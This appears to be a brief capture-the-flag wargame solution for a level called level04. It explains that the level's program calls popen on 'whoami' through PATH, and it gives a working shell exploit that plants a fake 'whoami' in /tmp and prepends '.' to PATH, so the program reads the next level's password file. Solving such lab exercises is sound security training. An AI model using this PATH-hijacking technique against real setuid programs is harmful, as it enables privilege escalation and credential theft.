First Try!
`popen(whoami)` searches PATH for the program -> we control PATH!
we can prepend the path of any dir to which we have write access to PATH

Solution:
```
__writable_dir="/tmp/myname$(date --rfc-3339=seconds)"
mkdir -p "$__writable_dir"
cd "$__writable_dir"
echo 'cat /home/level5/.pass' > whoami
chmod +x whoami
export PATH=.:$PATH
/levels/level04
```
